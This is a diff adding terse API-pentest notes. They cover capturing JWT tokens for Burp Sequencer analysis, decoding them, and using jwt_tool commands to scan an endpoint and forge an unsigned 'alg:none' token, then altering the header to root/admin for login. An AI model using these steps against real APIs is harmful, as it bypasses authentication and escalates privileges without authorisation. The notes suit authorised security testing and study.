@@ -33,9 +33,41 @@
 
 
 
-	
 	#API Token Attacks#
     
+		[Token Analysis] 
+	
+		login using username and password using Postman, capture the request and send it to sequsencer 
+			live capture
+				
+				token location within response
+					custom location: select the jwt token
+			
+			start live-capture > auto analyze
+			
+			
+		[JWT Attacks]
+
+			echo eyJfsaf1Mijvsdv|base64 -d			header | payload | security
+				{"alg": "HS512", "typ": "JWT"}
+				
+			
+			jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+						show token output
+				
+					
+			jwt_tool -t https://exampl.com/identity/api/v2/user/dashbard -rh "Authorization: Bearer JWT-TOKEN" -M pb
+		
+			jwt_tool -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3OD -X a 
+					
+					this will create new JWT Token with none:alg and signature
+					attempt login with this token
+					
+			edit header token to root/admin and update token.
+			
+			
+			
+		
     
     
     
